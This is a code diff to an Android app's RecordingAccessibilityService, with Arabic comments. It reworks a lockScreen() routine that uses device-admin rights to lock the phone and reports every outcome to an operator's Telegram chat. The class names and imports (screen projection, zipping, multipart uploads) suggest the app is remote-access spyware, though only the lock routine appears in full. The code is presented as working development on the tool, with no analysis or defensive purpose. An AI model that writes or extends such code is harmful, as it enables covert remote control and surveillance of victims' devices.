@@ -8,13 +8,14 @@ import android.app.ActivityManager;
 import android.app.AlarmManager;
 import android.app.KeyguardManager;
 import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
-import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -56,6 +57,7 @@ import java.util.Locale;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
+import okhttp3.FormBody;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
@@ -320,19 +322,28 @@ public class RecordingAccessibilityService extends AccessibilityService {
     }
 
     private void lockScreen() {
-        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            keyguardManager.requestDismissKeyguard(this, null);
+        try {
+            // محاولة قفل الشاشة عبر Device Admin
+            DevicePolicyManager policyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
+            
+            if (policyManager.isAdminActive(adminReceiver)) {
+                policyManager.lockNow();
+                sendToTelegram("🔒 تم قفل الشاشة عبر Admin", CHAT_ID);
+            } else {
+                // إذا ما فيه Admin، استخدم Keyguard
+                KeyguardManager keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    // هذا يحتاج Activity، لذلك نرسل برودكاست لنشاط رئيسي
+                    Intent intent = new Intent("LOCK_SCREEN_NOW");
+                    sendBroadcast(intent);
+                    sendToTelegram("🔒 جاري قفل الشاشة...", CHAT_ID);
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            sendToTelegram("❌ فشل قفل الشاشة: " + e.getMessage(), CHAT_ID);
         }
-        
-        // قفل الشاشة
-        DevicePolicyManager policyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
-        if (policyManager.isAdminActive(adminReceiver)) {
-            policyManager.lockNow();
-        }
-        
-        sendToTelegram("🔒 تم قفل الشاشة", CHAT_ID);
     }
 
     private void turnScreenOff() {
@@ -558,4 +569,4 @@ public class RecordingAccessibilityService extends AccessibilityService {
             mediaProjection.stop();
         }
     }
-              }
+}
